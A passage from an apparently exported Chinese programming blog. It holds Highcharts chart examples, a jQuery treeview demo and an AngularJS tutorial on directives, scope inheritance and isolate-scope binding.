of the chart each second var series = this.series[0]; setInterval(function () &#123; var x = (new Date()).getTime(), // current time y = Math.random(); series.addPoint([x, y], true, true); &#125;, 1000); &#125; &#125; &#125;; var title = &#123; text: 'Live random data' &#125;; var xAxis = &#123; type: 'datetime', tickPixelInterval: 150 &#125;; var yAxis = &#123; title: &#123; text: 'Value' &#125;, plotLines: [&#123; value: 0, width: 1, color: '#808080' &#125;] &#125;; var tooltip = &#123; formatter: function () &#123; return '&lt;b&gt;' + this.series.name + '&lt;/b&gt;&lt;br/&gt;' + Highcharts.dateFormat('%Y-%m-%d %H:%M:%S', this.x) + '&lt;br/&gt;' + Highcharts.numberFormat(this.y, 2); &#125; &#125;; var plotOptions = &#123; area: &#123; pointStart: 1940, marker: &#123; enabled: false, symbol: 'circle', radius: 2, states: &#123; hover: &#123; enabled: true &#125; &#125; &#125; &#125; &#125;; var legend = &#123; enabled: false &#125;; var exporting = &#123; enabled: false &#125;; var series= [&#123; name: 'Random data', data: (function () &#123; // generate an array of random data var data = [],time = (new Date()).getTime(),i; for (i = -19; i &lt;= 0; i += 1) &#123; data.push(&#123; x: time + i * 1000, y: Math.random() &#125;); &#125; return data; &#125;()) &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.legend = legend; json.exporting = exporting; json.series = series; json.plotOptions = plotOptions; Highcharts.setOptions(&#123; global: &#123; useUTC: false &#125; &#125;); $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 组合图示例示例1 柱形图，线条图，饼图组合 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var title = &#123; text: 'Combination chart' &#125;; var xAxis = &#123; categories: ['Apples', 'Oranges', 'Pears', 'Bananas', 'Plums'] &#125;; var labels = &#123; items: [&#123; html: '水果消费', style: &#123; left: '50px', top: '18px', color: (Highcharts.theme &amp;&amp; Highcharts.theme.textColor) || 'black' &#125; &#125;] &#125;; var series= [&#123; type: 'column', name: 'Jane', data: [3, 2, 1, 3, 4] &#125;, &#123; type: 'column', name: 'John', data: [2, 3, 5, 7, 6] &#125;, &#123; type: 'column', name: 'Joe', data: [4, 3, 3, 9, 0] &#125;, &#123; type: 'spline', name: 'Average', data: [3, 2.67, 3, 6.33, 3.33], marker: &#123; lineWidth: 2, lineColor: Highcharts.getOptions().colors[3], fillColor: 'white' &#125; &#125;, &#123; type: 'pie', name: '总消费', data: [&#123; name: 'Jane', y: 13, color: Highcharts.getOptions().colors[0] // Jane 的颜色 &#125;, &#123; name: 'John', y: 23, color: Highcharts.getOptions().colors[1] // John 的颜色 &#125;, &#123; name: 'Joe', y: 19, color: Highcharts.getOptions().colors[2] // Joe 的颜色 &#125;], center: [100, 80], size: 100, showInLegend: false, dataLabels: &#123; enabled: false &#125; &#125; ]; var json = &#123;&#125;; json.title = title; json.xAxis = xAxis; json.labels = labels; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2散点图上添加回归线 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var title = &#123; text: '散点图上添加回归线' &#125;; var xAxis = &#123; min: -0.5, max: 5.5 &#125;; var yAxis= &#123; min: 0 &#125;; var series= [&#123; type: 'line', name: '回归线', data: [[0, 1.11], [5, 4.51]], marker: &#123; enabled: false &#125;, states: &#123; hover: &#123; lineWidth: 0 &#125; &#125;, enableMouseTracking: false &#125;, &#123; type: 'scatter', name: '观察点', data: [1, 1.5, 2.8, 3.5, 3.9, 4.2], marker: &#123; radius: 4 &#125; &#125; ]; var json = &#123;&#125;; json.title = title; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 3D图示例示例1 3D柱形图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts-3d.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;div id="sliders"&gt;&lt;table&gt; &lt;tr&gt;&lt;td&gt;Alpha Angle&lt;/td&gt;&lt;td&gt;&lt;input id="R0" type="range" min="0" max="45" value="15"/&gt; &lt;span id="R0-value" class="value"&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Beta Angle&lt;/td&gt;&lt;td&gt;&lt;input id="R1" type="range" min="0" max="45" value="15"/&gt; &lt;span id="R1-value" class="value"&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; renderTo: 'container', type: 'column', margin: 75, options3d: &#123; enabled: true, alpha: 15, beta: 15, depth: 50, viewDistance: 25 &#125; &#125;; var title = &#123; text: '图表旋转实例' &#125;; var subtitle = &#123; text: '通过拖动下面的滑块测试' &#125;; var plotOptions = &#123; column: &#123; depth: 25 &#125; &#125;; var series= [&#123; data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6, 54.4] &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.series = series; json.plotOptions = plotOptions; var highchart = new Highcharts.Chart(json); function showValues() &#123; $('#R0-value').html(highchart.options.chart.options3d.alpha); $('#R1-value').html(highchart.options.chart.options3d.beta); &#125; // Activate the sliders $('#R0').on('change', function () &#123; highchart.options.chart.options3d.alpha = this.value; showValues(); highchart.redraw(false); &#125;); $('#R1').on('change', function () &#123; highchart.options.chart.options3d.beta = this.value; showValues(); highchart.redraw(false); &#125;); showValues();&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 测量图示例示例1车速表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts-more.js"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'gauge', plotBackgroundColor: null, plotBackgroundImage: null, plotBorderWidth: 0, plotShadow: false &#125;; var title = &#123; text: '车速表' &#125;; var pane = &#123; startAngle: -150, endAngle: 150, background: [&#123; backgroundColor: &#123; linearGradient: &#123; x1: 0, y1: 0, x2: 0, y2: 1 &#125;, stops: [ [0, '#FFF'], [1, '#333'] ] &#125;, borderWidth: 0, outerRadius: '109%' &#125;, &#123; backgroundColor: &#123; linearGradient: &#123; x1: 0, y1: 0, x2: 0, y2: 1 &#125;, stops: [ [0, '#333'], [1, '#FFF'] ] &#125;, borderWidth: 1, outerRadius: '107%' &#125;, &#123; // default background &#125;, &#123; backgroundColor: '#DDD', borderWidth: 0, outerRadius: '105%', innerRadius: '103%' &#125;] &#125;; // the value axis var yAxis = &#123; min: 0, max: 200, minorTickInterval: 'auto', minorTickWidth: 1, minorTickLength: 10, minorTickPosition: 'inside', minorTickColor: '#666', tickPixelInterval: 30, tickWidth: 2, tickPosition: 'inside', tickLength: 10, tickColor: '#666', labels: &#123; step: 2, rotation: 'auto' &#125;, title: &#123; text: 'km/h' &#125;, plotBands: [&#123; from: 0, to: 120, color: '#55BF3B' // green &#125;, &#123; from: 120, to: 160, color: '#DDDF0D' // yellow &#125;, &#123; from: 160, to: 200, color: '#DF5353' // red &#125;] &#125;; var series= [&#123; name: 'Speed', data: [80], tooltip: &#123; valueSuffix: ' km/h' &#125; &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.pane = pane; json.yAxis = yAxis; json.series = series; // Add some life var chartFunction = function (chart) &#123; if (!chart.renderer.forExport) &#123; setInterval(function () &#123; var point = chart.series[0].points[0], newVal, inc = Math.round((Math.random() - 0.5) * 20); newVal = point.y + inc; if (newVal &lt; 0 || newVal &gt; 200) &#123; newVal = point.y - inc; &#125; point.update(newVal); &#125;, 3000); &#125; &#125;; $('#container').highcharts(json,chartFunction);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2图形进度式测量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts-more.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/modules/solid-gauge.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="width: 600px; height: 400px; margin: 0 auto"&gt; &lt;div id="container-speed" style="width: 300px; height: 200px; float: left"&gt;&lt;/div&gt; &lt;div id="container-rpm" style="width: 300px; height: 200px; float: left"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'solidgauge' &#125;; var title = null; var pane = &#123; center: ['50%', '85%'], size: '140%', startAngle: -90, endAngle: 90, background: &#123; backgroundColor: (Highcharts.theme &amp;&amp; Highcharts.theme.background2) || '#EEE', innerRadius: '60%', outerRadius: '100%', shape: 'arc' &#125; &#125;; var tooltip = &#123; enabled: false &#125;; // the value axis var yAxis = &#123; stops: [ [0.1, '#55BF3B'], // green [0.5, '#DDDF0D'], // yellow [0.9, '#DF5353'] // red ], lineWidth: 0, minorTickInterval: null, tickPixelInterval: 400, tickWidth: 0, title: &#123; y: -70 &#125;, labels: &#123; y: 16 &#125;, min: 0, max: 200, title: &#123; text: 'Speed' &#125; &#125;; var plotOptions = &#123; solidgauge: &#123; dataLabels: &#123; y: 5, borderWidth: 0, useHTML: true &#125; &#125; &#125;; var credits = &#123; enabled: false &#125;; var series = [&#123; name: 'Speed', data: [80], dataLabels: &#123; format: '&lt;div style="text-align:center"&gt;&lt;span style="font-size:25px;color:' + ((Highcharts.theme &amp;&amp; Highcharts.theme.contrastTextColor) || 'black') + '"&gt;&#123;y&#125;&lt;/span&gt;&lt;br/&gt;' + '&lt;span style="font-size:12px;color:silver"&gt;km/h&lt;/span&gt;&lt;/div&gt;' &#125;, tooltip: &#123; valueSuffix: ' km/h' &#125; &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.pane = pane; json.tooltip = tooltip; json.yAxis = yAxis; json.credits = credits; json.series = series; $('#container-speed').highcharts(json); // the value axis yAxis = &#123; stops: [ [0.1, '#55BF3B'], // green [0.5, '#DDDF0D'], // yellow [0.9, '#DF5353'] // red ], lineWidth: 0, minorTickInterval: null, tickPixelInterval: 400, tickWidth: 0, title: &#123; y: -70 &#125;, labels: &#123; y: 16 &#125;, min: 0, max: 5, title: &#123; text: 'RPM' &#125; &#125;; series = [&#123; name: 'RPM', data: [1], dataLabels: &#123; format: '&lt;div style="text-align:center"&gt;&lt;span style="font-size:25px;color:' + ((Highcharts.theme &amp;&amp; Highcharts.theme.contrastTextColor) || 'black') + '"&gt;&#123;y:.1f&#125;&lt;/span&gt;&lt;br/&gt;' + '&lt;span style="font-size:12px;color:silver"&gt;* 1000 / min&lt;/span&gt;&lt;/div&gt;' &#125;, tooltip: &#123; valueSuffix: ' revolutions/min' &#125; &#125;]; json.yAxis = yAxis; json.series = series; $('#container-rpm').highcharts(json); var chartFunction = function() &#123; // Speed var chart = $('#container-speed').highcharts(); var point; var newVal; var inc; if (chart) &#123; point = chart.series[0].points[0]; inc = Math.round((Math.random() - 0.5) * 100); newVal = point.y + inc; if (newVal &lt; 0 || newVal &gt; 200) &#123; newVal = point.y - inc; &#125; point.update(newVal); &#125; // RPM chart = $('#container-rpm').highcharts(); if (chart) &#123; point = chart.series[0].points[0]; inc = Math.random() - 0.5; newVal = point.y + inc; if (newVal &lt; 0 || newVal &gt; 5) &#123; newVal = point.y - inc; &#125; point.update(newVal); &#125; &#125;; // Bring life to the dials setInterval(chartFunction, 2000);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例3音量表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts-more.js"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'gauge', plotBorderWidth: 1, plotBackgroundColor: &#123; linearGradient: &#123; x1: 0, y1: 0, x2: 0, y2: 1 &#125;, stops: [ [0, '#FFF4C6'], [0.3, '#FFFFFF'], [1, '#FFF4C6'] ] &#125;, plotBackgroundImage: null, height: 200 &#125;; var credits = &#123; enabled: false &#125;; var title = &#123; text: '音量表（VU Meter）' &#125;; var pane = [&#123; startAngle: -45, endAngle: 45, background: null, center: ['25%', '145%'], size: 300 &#125;, &#123; startAngle: -45, endAngle: 45, background: null, center: ['75%', '145%'], size: 300 &#125;]; var yAxis = [&#123; min: -20, max: 6, minorTickPosition: 'outside', tickPosition: 'outside', labels: &#123; rotation: 'auto', distance: 20 &#125;, plotBands: [&#123; from: 0, to: 6, color: '#C02316', innerRadius: '100%', outerRadius: '105%' &#125;], pane: 0, title: &#123; text: 'VU&lt;br/&gt;&lt;span style="font-size:8px"&gt;Channel A&lt;/span&gt;', y: -40 &#125; &#125;, &#123; min: -20, max: 6, minorTickPosition: 'outside', tickPosition: 'outside', labels: &#123; rotation: 'auto', distance: 20 &#125;, plotBands: [&#123; from: 0, to: 6, color: '#C02316', innerRadius: '100%', outerRadius: '105%' &#125;], pane: 1, title: &#123; text: 'VU&lt;br/&gt;&lt;span style="font-size:8px"&gt;Channel B&lt;/span&gt;', y: -40 &#125; &#125;]; var plotOptions = &#123; gauge: &#123; dataLabels: &#123; enabled: false &#125;, dial: &#123; radius: '100%' &#125; &#125; &#125;; var series= [&#123; data: [-20], yAxis: 0 &#125;, &#123; data: [-20], yAxis: 1 &#125;]; var json = &#123;&#125;; json.chart = chart; json.credits = credits; json.title = title; json.pane = pane; json.yAxis = yAxis; json.plotOptions = plotOptions; json.series = series; // Add some life var chartFunction = function (chart) &#123; setInterval(function () &#123; if (chart.series) &#123; // the chart may be destroyed var left = chart.series[0].points[0], right = chart.series[1].points[0], leftVal, rightVal, inc = (Math.random() - 0.5) * 3; leftVal = left.y + inc; rightVal = leftVal + inc / 3; if (leftVal &lt; -20 || leftVal &gt; 6) &#123; leftVal = left.y - inc; &#125; if (rightVal &lt; -20 || rightVal &gt; 6) &#123; rightVal = leftVal; &#125; left.update(leftVal, false); right.update(rightVal, false); chart.redraw(); &#125; &#125;, 500); &#125;; $('#container').highcharts(json, chartFunction); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; jQuery树形目录1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;link rel="stylesheet" href="https://static.runoob.com/assets/js/jquery-treeview/jquery.treeview.css" /&gt; &lt;link rel="stylesheet" href="https://static.runoob.com/assets/js/jquery-treeview/screen.css" /&gt; &lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://static.runoob.com/assets/js/jquery-treeview/jquery.cookie.js"&gt;&lt;/script&gt; &lt;script src="https://static.runoob.com/assets/js/jquery-treeview/jquery.treeview.js" type="text/javascript"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function()&#123; $("#browser").treeview(&#123; toggle: function() &#123; console.log("%s was toggled.", $(this).find("&gt;span").text()); &#125; &#125;); $("#add").click(function() &#123; var branches = $("&lt;li&gt;&lt;span class='folder'&gt;New Sublist&lt;/span&gt;&lt;ul&gt;" + "&lt;li&gt;&lt;span class='file'&gt;Item1&lt;/span&gt;&lt;/li&gt;" + "&lt;li&gt;&lt;span class='file'&gt;Item2&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;").appendTo("#browser"); $("#browser").treeview(&#123; add: branches &#125;); &#125;); &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 id="banner"&gt;jQuery Treeview 简单实例&lt;/h1&gt; &lt;div id="main"&gt; &lt;ul id="browser" class="filetree treeview-famfamfam"&gt; &lt;li&gt;&lt;span class="folder"&gt;Folder 1&lt;/span&gt; &lt;ul&gt; &lt;li&gt;&lt;span class="folder"&gt;Item 1.1&lt;/span&gt; &lt;ul&gt; &lt;li&gt;&lt;span class="file"&gt;Item 1.1.1&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;span class="folder"&gt;Folder 2&lt;/span&gt; &lt;ul&gt; &lt;li&gt;&lt;span class="folder"&gt;Subfolder 2.1&lt;/span&gt; &lt;ul id="folder21"&gt; &lt;li&gt;&lt;span class="file"&gt;File 2.1.1&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;span class="file"&gt;File 2.1.2&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;span class="folder"&gt;Subfolder 2.2&lt;/span&gt; &lt;ul&gt; &lt;li&gt;&lt;span class="file"&gt;File 2.2.1&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;span class="file"&gt;File 2.2.2&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class="closed"&gt;&lt;span class="folder"&gt;Folder 3 (closed at start)&lt;/span&gt; &lt;ul&gt; &lt;li&gt;&lt;span class="file"&gt;File 3.1&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;span class="file"&gt;File 4&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;button id="add"&gt;Add!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之指令2]]></title>
    <url>%2F2017%2F03%2F09%2Ffirst%2F</url>
    <content type="text"><![CDATA[对最基本的web技术的认识 HTML文档是一个纯文本文件，包含了页面的结构以及由CSS定义的样式，或者可以操作样式的JavaScript代码。 HTML节点是嵌套在另一个元素内元素或一串字符。除了文本节点外，所有元素都是节点。 HTML元素由一个开始标签和一个结束标签组成。 HTML标签用来标记元素的开始和结束。标签本身用尖括号来声明。- - 属性，用来给HTML元素添加额外的信息。这些属性设置在开始标记中。可以使用形如key=”value”的键值对设置它们，或者只设置键。 自定义HTML元素和属性基于我们对HTML元素的理解，指令本质上就是angularjs扩展具有自定义功能的HTML元素的途径。示例：我们可以创建一个自定义元素，它实现了标签的功能并且能在所有浏览器中工作:12&lt;my-better-video my-href="/goofy-video.mp4"&gt;Caneventaketext&lt;/my-better-video&gt; 注意，这个自定义元素使用了特殊的开始和闭合标签my-better-video,以及my-href这个自定义属性。为了让这个标签更有用，可以将浏览器默认的video标签重载，用下面的这种写法代替它:123&lt;video my-href="/goofy-video.mp4"&gt;Can stlll take children nodes&lt;/video&gt; 我的第一个指令:1234567891011&lt;my-directive&gt;&lt;/my-directive&gt;假设我们已经创建了一个完整的HTML文档，其中包含了angularjs，并且DOM中已经用ng-app指令标识出了应用的根元素，当angularjs编译HTML时就会调用指令。调用指令意味着执行指令背后与之相关联的JavaScript代码，这些代码是我们用指令定义写出来的。myDirective指令的定义看起来是这样的:angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'E', template:'&lt;a href="http://www.baidu.com"&gt;Click me to go to Google&lt;/a&gt;'&#125;;&#125;); 下面向指令定义中添加一些新的设置:我们可以将自定义标签从生成的DOM中完全移除掉，并只留下由模板生成的链接。将replace设置为true就可以实现这个效果:12345678angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'E', replace:true, template:'&lt;a href="http://www.baidu.com"&gt;Click me to go to baidu&lt;/a&gt;&#125;;&#125;); restrict参数有元素(E),属性(A),类(C)或注释(M)的格式来调用指令。示例:12345678angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'EAC', replace:true, template:'&lt;a href="http://www.baidu.com"&gt;Click me to go to Google&lt;/a&gt; &#125;;&#125;); 无论有多少种方式可以声明指令，我们坚持使用属性方式，因为它有比较好的跨浏览器兼容性： 表达式123&lt;h1 ng-init="greeting='HelloWorld'"&gt; The greeting is:&#123;&#123;greeting&#125;&#125;&lt;/h1&gt; 我们将表达式greeting = ‘Hello World’赋值给内置指令ng-init,在表达式中，我们将greeting属性的值设置为Hello World,然后计算花括号内的这个表达式的值。这两种情况都会在当前作用域中计算一个普通的JavaScript表达式。根据这个表达式的值。这两种情况都会在当前作用域中计算一个普通的JavaScript表达式。根据这个表达式放置的位置不同，当前作用域可以是angularjs在应用启动时调用ng-app实例化的$rootScope,也可以是某个自作用域，比如某个控制器的作用域。用表达式来声明指令我们知道声明指令时既可以使用表达式，也可以不使用表达式,回顾几种合法的表达式声明。1234&lt;my-directive="someExpression&gt;&lt;/my-directive&gt;&lt;div my-directive="someExpression&gt;&lt;/div&gt;&lt;div class="my-directive:someExpression"&gt;&lt;/div&gt;&lt;!-- directive:my-directive someExpression --&gt; 这里有一个值得注意的问题，赋值给指令的表达式会在哪个环境运行？要知道这个，首先要了解一个复杂但非常重要的概念，就是当前作用域，它由DOM周围嵌套的控制器提供。首先快速了解一下由DOM通过内置指令ng-controller提供的作用域。这个指令的作用是在DOM中创建一个新的自作用域:12345678910111213141516171819202122232425262728&lt;p&gt;we can access:&#123;&#123;rootProperty&#125;&#125;&lt;/p&gt;&lt;div ng-controller="ParentController"&gt;&lt;p&gt;We can access:&#123;&#123;rootProperty&#125;&#125; and &#123;&#123;parentProperty&#125;&#125;&lt;/p&gt;&lt;div ng-controller="childController"&gt;&lt;p&gt; we can access: &#123;&#123;rootProperty&#125;&#125; and &#123;&#123;parentProperty&#125;&#125; and &#123;&#123;childProperty&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;fullSentenceFromChild&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;angular.module('myApp',[]).run(function($rootScope)&#123; //使用.run访问$rootScope $rootScope.rootProperty='root scope';&#125;).controller('ParentController',function($scope)&#123; //使用.controller访问'ng-controller'内部的属性 //在DOM忽略的$scope中，根据当前控制器进行推断 $scope.parentProperty = 'parent scope';&#125;).controller('ChildController',function($scope)&#123; $scope.childProperty = 'child scope'; //同在DOM中一样，我们可以通过当前$scope直接访问原型中的任意属性 $scope.fullSentenceFromChild = 'Same $scope: We can access:' + $scope.rootProperty + 'and'+$scope.parentProperty + 'and '+$scope.childProperty ;&#125;); angularjs作用域详解angularjs中，子作用域一般都会通过JavaScript原型继承机制继承其父作用域的属性和方法。但有一个例外:在directive中使用scope:{…},这种方式创建的作用域是一个独立的”Isolate”作用域，它也有父作用域，但父作用域不在原型链上，不会对父作用域进行原型继承。这种方式定义作用域通常用于构造可复用的directive组件。作用的原型继承是非常简单普遍的，甚至你不必关心它的运作。直到你在子作用域中向父作用域的原始类型属性使用双向数据绑定2-way data bingding，比如Form表单的ng-model为父作用域中的属性，且为原始类型，输入数据后，它不会如你期望的那样运行–Angularjs不会把输入数据写到你期望的父作用域属性中去，而是直接在子作用域创建同名属性并写入数据。这个行为符合JavaScript原型继承机制的行为。包括ng-repeat,ng-switch,ng-view,ng-include都会创建子作用域。示例1234比如:&lt;input type="text" ng-model="someObj.prop1"&gt;优于:&lt;input type="text" ng-model="prop1"&gt; 向指令中传递数据回顾一下如何定义指令:12345678angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'A', replace:true, template:'&lt;a href="http://www.baidu.com"&gt;Click me to go to baidu&lt;/a&gt;&#125;&#125;); 我们在模板中硬编码了URL和链接文本:如果必将URL和链接文本混在指令内部，可以为其他使用我们指令的人提供更好的体验。我们的目标是关注指令的公共接口，就像其他任何编程语言一样。实际上，应该将上面的模板转换成可以接受两个变量的形式:一个变量是URL，另一个是链接文本:template:’在主HTML文档中，可以给指令添加myUrl和myLinkText两个属性，这两个参数会成为指令内部作用域的属性:123&lt;div my-directive my-url="http://www.baidu.com" my-link-text="click me go to baidu"&gt;&lt;/div&gt; 指令的@绑定策略我们用属性将数据从DOM中复制到指令的隔离作用域中:12345678910111213&lt;div my-directive my-url="http://www.baidu.com" my-link-text = "Click me go to baidu"&gt;&lt;/div&gt;angular.module('myApp',[]).directive('myDirective',function()&#123; return &#123; restrict:'A', replace:true, scope:&#123; myUrl:'@',//绑定策略 myLinkText:'@'//绑定策略 &#125;, template:'&lt;a href="&#123;&#123;myUrl&#125;&#125;"&gt;'+'&#123;&#123;myLinkText&#125;&#125;&lt;/a&gt;' &#125;;&#125;); 由于作用域中属性经常是私有的，因此可以指定我们希望将这个内部属性同哪个DOM属性进行绑定:1234scope:&#123; myUrl:'@someAttr', myLinkText:'@'&#125; 上面的隔离作用域中的内容是：将指令的私有属性$scope.myUrl同DOM中some-attr属性的值绑定起来。这个值既可以是硬编码的也可以是当前作用域(例如Some-attr=”“)中某个表达式的运算结果。在DOM中要用some-attr代替my-url:12&lt;div my-directive some-attr="http://www.baidu.com" my-link-text="click me go to baidu"&gt;&lt;/div&gt; 更进一步，还可以在DOM对应的作用域上运算表达式，并将结果传递给指令，在指令内部最终被绑定在属性上:12&lt;div my-directive some-attr="&#123;&#123;'http://'+'www.baidu.com'&#125;&#125;"&gt;&lt;/div&gt; 在此之上，我们来看看如何创建一个文本输入域，并将输入值同指令内部隔离作用域的属性绑定起来:123&lt;input type="text" ng-model="myUrl"/&gt;&lt;div my-directive some-attr="&#123;&#123;myUrl&#125;&#125;" my-link-text="Click me go to baidu"&gt;&lt;/div&gt; 这段代码是可以工作的，但如果我们将文本输入字段移到指令内部并在另一个指令中进行绑定，就无法正常工作了。1234&lt;div my-directive some-attr="&#123;&#123;myUrl&#125;&#125;" my-link-text="click me go to baidu"&gt;&lt;/div&gt;还有下面这段代码:template:'&lt;div&gt;&lt;input type="text" ng-model="myUrl"/&gt; &lt;a href="&#123;&#123;myUrl&#125;&#125;"&gt;&#123;&#123;myLinkText&#125;&#125;&lt;/a&gt;&lt;/div&gt; 